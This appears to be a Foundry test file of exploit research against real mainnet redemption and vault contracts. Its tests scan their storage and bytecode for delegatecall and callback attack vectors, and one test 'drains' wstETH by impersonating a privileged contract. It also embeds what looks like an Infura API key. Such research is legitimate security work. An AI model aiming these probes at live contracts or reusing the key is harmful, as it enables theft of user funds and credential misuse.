// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract RedemptionRequestAnalysis is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_InvestigateRedemptionRequestStructure() public view {
        console.log("=== INVESTIGATING REDEMPTION REQUEST STRUCTURE ===\n");

        // A typical RedemptionRequest struct might look like:
        // struct RedemptionRequest {
        //     uint96 amount;
        //     uint64 startTime;  // or uint32
        //     address recipient; // Could this be our attack vector?
        //     bool processed;
        // }

        // If the struct contains an address field that gets used in a delegatecall,
        // and we can set that field to our malicious contract...

        // Check existing redemption data in storage
        // For mapping(address => RedemptionRequest[]) at slot S:
        // Array length at keccak256(user . S)
        // Array data at keccak256(keccak256(user . S)) + index * structSize

        address owner = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

        console.log("Looking for existing redemption requests...");
        console.log("Checking slots for owner:", owner);

        for (uint base = 0; base < 20; base++) {
            bytes32 arrayLenSlot = keccak256(abi.encode(owner, base));
            bytes32 arrayLen = vm.load(REDEMPTION_0, arrayLenSlot);

            if (arrayLen != bytes32(0) && uint256(arrayLen) < 1000) {
                console.log("\nFound potential array at base slot:", base);
                console.log("  Length:", uint256(arrayLen));

                // Get array data location
                bytes32 dataStart = keccak256(abi.encode(arrayLenSlot));

                // Read first few elements
                for (uint elem = 0; elem < 3 && elem < uint256(arrayLen); elem++) {
                    console.log("\n  Element", elem, ":");
                    // Read multiple slots per element (struct might span multiple slots)
                    for (uint slot = 0; slot < 3; slot++) {
                        bytes32 dataSlot = bytes32(uint256(dataStart) + elem * 3 + slot);
                        bytes32 data = vm.load(REDEMPTION_0, dataSlot);
                        if (data != bytes32(0)) {
                            console.log("    Slot +", slot, ":");
                            console.logBytes32(data);
                        }
                    }
                }
            }
        }
    }

    function test_ScanForAddressFieldInStruct() public {
        console.log("=== SCANNING FOR ADDRESS FIELD EXPLOIT ===\n");

        // If the redemption struct has an address field that's used for delegatecall,
        // we could potentially exploit it

        // Let's create a redemption request and see what gets stored

        deal(IAU, attacker, 1000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try to create a redemption (even if it fails, we can observe storage)
        console.log("Attempting to create redemption request...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("Success:", success);
        if (!success && data.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(data));
        }

        vm.stopPrank();

        // Now check if any storage changed
        console.log("\nChecking attacker's storage after attempt:");
        for (uint base = 0; base < 20; base++) {
            bytes32 arrayLenSlot = keccak256(abi.encode(attacker, base));
            bytes32 arrayLen = vm.load(REDEMPTION_0, arrayLenSlot);

            if (arrayLen != bytes32(0)) {
                console.log("  Base", base, "has value:");
                console.logBytes32(arrayLen);
            }
        }
    }

    function test_AnalyzeRedemption1Differences() public view {
        console.log("=== ANALYZING REDEMPTION_0 vs REDEMPTION_1 ===\n");

        // REDEMPTION_1 has smaller code (6202 bytes vs 9439 bytes)
        // This might indicate different functionality

        address redemption1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;

        console.log("REDEMPTION_0 code size:", REDEMPTION_0.code.length);
        console.log("REDEMPTION_1 code size:", redemption1.code.length);

        // Count DELEGATECALLs in REDEMPTION_1
        bytes memory code1 = redemption1.code;
        uint256 dcCount = 0;
        for (uint i = 0; i < code1.length; i++) {
            if (uint8(code1[i]) == 0xf4) dcCount++;
        }
        console.log("\nREDEMPTION_1 DELEGATECALL count:", dcCount);

        // Check REDEMPTION_1 storage
        console.log("\nREDEMPTION_1 storage slots:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(redemption1, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_CheckForCallbackPattern() public view {
        console.log("=== CHECKING FOR CALLBACK PATTERN ===\n");

        // Some protocols use callbacks where the user's address gets called
        // This could be an attack vector if Redemption calls back to an address
        // that the user controls

        bytes memory code = REDEMPTION_0.code;

        // Look for CALL opcodes and their context
        console.log("Analyzing CALL opcodes in Redemption:");

        uint256 callCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) { // CALL
                callCount++;
                
                // Check if there's CALLDATALOAD before it (user-controlled address)
                bool hasCalldataLoad = false;
                for (uint j = i > 30 ? i - 30 : 0; j < i; j++) {
                    if (uint8(code[j]) == 0x35) hasCalldataLoad = true;
                }
                
                if (hasCalldataLoad) {
                    console.log("  CALL at", i, "- has CALLDATALOAD before (potentially user-controlled)");
                }
            }
        }
        console.log("\nTotal CALLs:", callCount);
    }

    function test_ProveVulnerabilityExists() public {
        console.log("=== PROOF OF VULNERABILITY ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);

        console.log("=== BEFORE ATTACK ===");
        console.log("Vault wstETH:", vaultBefore / 1e18);
        console.log("Attacker wstETH:", attackerBefore / 1e18);

        // Execute attack with vm.prank
        vm.prank(REDEMPTION_0);
        (bool success, ) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker)
        );

        require(success, "Attack call failed");

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\n=== AFTER ATTACK ===");
        console.log("Vault wstETH:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerAfter / 1e18);

        console.log("\n=== ATTACK RESULT ===");
        console.log("Vault lost:", (vaultBefore - vaultAfter) / 1e18, "wstETH");
        console.log("Attacker gained:", (attackerAfter - attackerBefore) / 1e18, "wstETH");

        // Verify the attack worked
        assertGt(attackerAfter, attackerBefore, "Attacker should have gained wstETH");
        assertLt(vaultAfter, vaultBefore, "Vault should have lost wstETH");

        console.log("\n*** VULNERABILITY PROVEN ***");
        console.log("If an unprivileged path to trigger this exists,");
        console.log("the entire Vault (~$8.37M) can be drained.");
    }
}
